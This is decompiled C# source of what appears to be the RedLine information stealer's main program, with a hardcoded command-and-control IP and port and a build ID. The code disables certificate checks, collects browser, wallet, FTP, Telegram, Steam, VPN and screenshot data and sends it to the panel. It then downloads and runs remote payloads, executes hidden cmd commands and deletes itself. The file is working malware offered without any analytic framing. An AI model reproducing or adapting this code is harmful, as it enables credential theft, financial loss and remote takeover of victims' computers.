using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using RedLine.Logic.Others;
using RedLine.Models;

namespace RedLine
{
	// Token: 0x02000003 RID: 3
	public static class Program
	{
		// Token: 0x06000005 RID: 5 RVA: 0x00002050 File Offset: 0x00000250
		static Program()
		{
			ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object _, X509Certificate __, X509Chain ___, SslPolicyErrors ____) => true));
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002078 File Offset: 0x00000278
		public static void Main(string[] args)
		{
			string text = "95.181.172.34:35253";
			string buildId = "loshariki";
			try
			{
				try
				{
					ServicePointManager.Expect100Continue = true;
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12);
				}
				catch
				{
				}
				bool flag;
				UserLog log;
				Action<IRemotePanel> <>9__0;
				do
				{
					flag = false;
					try
					{
						foreach (string remoteIP in text.Split(new char[]
						{
							'|'
						}))
						{
							try
							{
								Action<IRemotePanel> codeBlock;
								if ((codeBlock = <>9__0) == null)
								{
									codeBlock = (<>9__0 = delegate(IRemotePanel panel)
									{
										ClientSettings settings = null;
										try
										{
											settings = panel.GetSettings();
										}
										catch (Exception)
										{
											settings = new ClientSettings
											{
												BlacklistedCountry = new List<string>(),
												BlacklistedIP = new List<string>(),
												GrabBrowsers = true,
												GrabFiles = true,
												GrabFTP = true,
												GrabImClients = true,
												GrabPaths = new List<string>(),
												GrabUserAgent = true,
												GrabWallets = true,
												GrabScreenshot = true,
												GrabSteam = true,
												GrabTelegram = true,
												GrabVPN = true
											};
										}
										UserLog log = UserLogHelper.Create(settings);
										log.Exceptions = new List<string>();
										log.BuildID = buildId;
										log.Credentials = CredentialsHelper.Create(settings);
										log.SendTo(panel);
										log = log;
										log.Credentials = new Credentials();
										IList<RemoteTask> tasks = panel.GetTasks(log);
										if (tasks != null)
										{
											foreach (RemoteTask remoteTask in tasks)
											{
												try
												{
													if (log.ContainsDomains(remoteTask.DomainsCheck) && Program.CompleteTask(remoteTask))
													{
														panel.CompleteTask(log, remoteTask.ID);
													}
												}
												catch
												{
												}
											}
										}
									});
								}
								GenericService<IRemotePanel>.Use(codeBlock, remoteIP);
								flag = true;
								break;
							}
							catch
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
				while (!flag);
			}
			catch (Exception)
			{
			}
			finally
			{
				InstallManager.RemoveCurrent();
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002170 File Offset: 0x00000370
		private static bool CompleteTask(RemoteTask task)
		{
			bool result = false;
			try
			{
				switch (task.Action)
				{
				case RemoteTaskAction.Download:
					try
					{
						string[] array = task.Target.Split(new char[]
						{
							'|'
						});
						if (array.Length == 0)
						{
							new WebClient().DownloadString(task.Target);
						}
						if (array.Length == 2)
						{
							new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
						}
					}
					catch
					{
					}
					result = true;
					break;
				case RemoteTaskAction.RunPE:
					result = true;
					break;
				case RemoteTaskAction.DownloadAndEx:
				{
					string[] array2 = task.Target.Split(new char[]
					{
						'|'
					});
					if (array2.Length == 2)
					{
						new WebClient().DownloadFile(array2[0], Environment.ExpandEnvironmentVariables(array2[1]));
						Process.Start(new ProcessStartInfo
						{
							WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array2[1])).Directory.FullName,
							FileName = Environment.ExpandEnvironmentVariables(array2[1])
						});
					}
					result = true;
					break;
				}
				case RemoteTaskAction.OpenLink:
					Process.Start(task.Target);
					result = true;
					break;
				case RemoteTaskAction.Cmd:
					Process.Start(new ProcessStartInfo("cmd", "/C " + task.Target)
					{
						RedirectStandardError = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						CreateNoWindow = true
					});
					result = true;
					break;
				}
			}
			catch
			{
			}
			return result;
		}
	}
}
